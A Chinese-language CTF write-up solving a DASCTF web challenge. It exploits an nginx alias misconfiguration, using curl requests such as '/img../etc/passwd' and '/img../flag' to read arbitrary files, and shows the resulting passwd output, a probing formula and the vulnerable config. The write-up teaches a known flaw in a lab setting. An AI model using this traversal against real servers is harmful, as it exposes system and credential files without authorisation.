【DASCTF u1s1】平台：dasctf｜难度：☆☆☆｜日期：2026-08-01

## 考点
nginx alias 配置错误导致路径穿越（任意文件读取）
对应专栏：hc-web/dir_traversal.md + any_file_read.md

## 完整解题过程（每一步：思路→命令→输出→解读）

### 第 0 步：信息收集
【思路】先看页面长什么样，找入口。
【命令】
```bash
curl.exe -i https://靶机/
```
【输出】极简静态页：标题 u1s1，正文 HELLO!，一张图 `img/img.gif`
【解读】纯静态站（openresty 直接吐 HTML），没有 PHP 入口——**flag 只能在文件系统里**。

### 第 1 步：目录探测
【思路】静态站先扫目录/敏感文件（我们的例行公事）。
【命令】
```bash
# 常见路径探测
curl -s -o NUL -w "%{http_code}" 靶机/robots.txt
curl -s -o NUL -w "%{http_code}" 靶机/.git/HEAD
curl -s -o NUL -w "%{http_code}" 靶机/img/
```
【输出】`img/` → **200**（其他全 404）
【解读】`img/` 目录存在且可访问——**进一步看它是否开了目录列表**。

### 第 2 步：发现目录列表 + alias 线索
【思路】访问 img/ 看能不能列出内容。
【命令】
```bash
curl.exe 靶机/img/
```
【输出】
```
Index of /img/
../    img.gif   04-Oct-2018 05:55  456384
```
【解读】目录列表开着，但只有 img.gif。**注意**：目录名是 `/img/`，而文件却是从别处来的——这是 nginx alias 映射的典型迹象（提示已给：`location /img { alias /tmp/; }`）。

### 第 3 步：测试 alias 路径穿越
【思路】alias 漏洞的探测公式：`/映射前缀../目标路径`。先拿系统文件试。
【命令】
```bash
curl.exe 靶机/img../etc/passwd
```
【输出】
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```
【解读】**实锤穿越**！`/img../etc/passwd` 被解析成 `/tmp/../etc/passwd` = `/etc/passwd`。服务器上任何文件都读得了。

### 第 4 步：读根目录 flag
【思路】flag 一般叫 flag / flag.txt，放根目录。直接用穿越公式读。
【命令】
```bash
curl.exe 靶机/img../flag
```
【输出】`n1book{afr_2_solved}`
【解读】flag 到手！

flag：`n1book{afr_2_solved}`

## 解题思路总览（一张图）

```
静态页 + img/ 目录可列
   → 猜 nginx alias 映射（纯静态无 PHP = 往配置想）
   → 套穿越公式 /img../etc/passwd
   → 系统文件读出来了 = 实锤任意文件读取
   → /img../flag → flag ✅
```

## 完整命令速查（4 条）

```bash
# 1. 看页面（信息收集）
curl.exe https://靶机/

# 2. 看目录列表（攻击面提示）
curl.exe https://靶机/img/
# Index of /img/ ... img.gif

# 3. 穿越实锤（万能验证：读 /etc/passwd）
curl.exe https://靶机/img../etc/passwd
# root:x:0:0:root:...

# 4. 读 flag
curl.exe https://靶机/img../flag
# n1book{afr_2_solved}
```

flag：`n1book{afr_2_solved}`

## 核心知识点：nginx alias 穿越

### 为什么会有 /img → /tmp 这种映射（常见理由）

| 场景 | 原因 |
|---|---|
| 上传文件存 web 目录外 | 上传目录在 `/tmp` 等 web 根之外（防脚本执行），alias 映射出来供显示 |
| 静态资源不在 web 根 | 图片/素材在别的目录，借 alias 挂到站点 URL 下 |
| CTF 容器部署 | 容器 /tmp 是常见可写目录，附件放那顺手映射 |

> alias 的意义 = 把"web 根目录之外"的文件映射到 URL。合理需求，但配置不检查 `../` 就变漏洞。
> 黑盒下猜不到确切原因，但"静态资源 + 目录可列"就是想到 alias 的信号。

### 配置长这样（漏洞根源）
```nginx
location /img {
    alias /tmp/;      # /img 开头的请求 → 映射到 /tmp/ 目录
}
```

### 漏洞原理
```
正常请求:  /img/img.gif      → /tmp/ + img.gif       = /tmp/img.gif ✅
穿越请求:  /img../etc/passwd → /tmp/ + ../etc/passwd = /etc/passwd ❌ 越权！
```
nginx 替换前缀后**不检查剩下的 `../`**，直接拼接 → 一个 `../` 就退回根目录。

### 探测/利用公式
```
<映射前缀>../<目标文件>
例子：/img../etc/passwd   /img../flag   /img../flag.txt
```

### 什么时候想到这个漏洞
- 目录名和实际内容"对不上"（/img/ 里却出现奇怪文件）
- 纯静态站（没有 PHP）但感觉文件系统里有东西
- 响应头是 openresty/nginx + 目录列表开着 → 检查 alias 映射

## 收获
1. **alias vs root 的区别**：root 拼接完整路径，alias 替换前缀——alias 更容易出穿越
2. **目录列表 = 攻击面提示**：能列目录说明 nginx 配置宽松，试试 alias 穿越
3. **读文件三兄弟**：LFI（PHP include）/ 目录穿越（路径拼接）/ nginx alias 穿越（配置错误）——都是"任意文件读取"家族
4. 题目名 u1s1（有一说一）也是提示：flag 就在根目录摆着，看你读不读得到

## 常见坑
- alias 穿越只对**前缀匹配**的 location 有效（`location /img` 没有结尾斜杠时最危险）
- 穿越后目录列表也可能打开：`/img../` 直接列出根目录，省得猜文件名
